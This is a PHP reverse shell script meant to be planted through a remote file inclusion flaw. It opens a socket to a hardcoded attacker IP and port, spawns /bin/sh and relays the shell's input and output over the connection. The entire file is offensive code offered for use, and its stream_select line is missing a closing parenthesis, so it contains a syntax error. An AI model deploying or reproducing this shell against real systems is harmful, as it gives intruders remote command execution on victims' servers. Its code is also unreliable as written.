<?php
// PHP Reverse Shell (RFI-Compatible)
// Usage: Upload via RFI and trigger execution to connect back to your listener.

set_time_limit(0);
$ip = '10.10.14.170';    // Attacker's IP (Change this)
$port = 4444;  // Attacker's Port (Change if needed)
$sock = fsockopen($ip, $port, $errno, $errstr, 30);

if(!$sock) {
    echo "$errstr ($errno)\n";
    exit(1);
}

// Spawn a shell process
$descriptorspec = array(
    0 => array("pipe", "r"),  // stdin
    1 => array("pipe", "w"),  // stdout
    2 => array("pipe", "w")   // stderr
);

$process = proc_open('/bin/sh', $descriptorspec, $pipes);

if (is_resource($process)) {
    stream_set_blocking($pipes[0], 0);
    stream_set_blocking($pipes[1], 0);
    stream_set_blocking($pipes[2], 0);
    stream_set_blocking($sock, 0);

    // Relay data between shell and socket
    while (1) {
        if (feof($sock)) break;
        if (feof($pipes[1])) break;

        $read = array($sock, $pipes[1], $pipes[2]);
        $write = NULL;
        $except = NULL;

        if (stream_select($read, $write, $except, NULL) {
            foreach ($read as $stream) {
                if ($stream == $sock) {
                    $input = fread($sock, 1024);
                    fwrite($pipes[0], $input);
                }
                else if ($stream == $pipes[1]) {
                    $output = fread($pipes[1], 1024);
                    fwrite($sock, $output);
                }
                else if ($stream == $pipes[2]) {
                    $error = fread($pipes[2], 1024);
                    fwrite($sock, $error);
                }
            }
        }
    }

    fclose($sock);
    proc_close($process);
}
?>
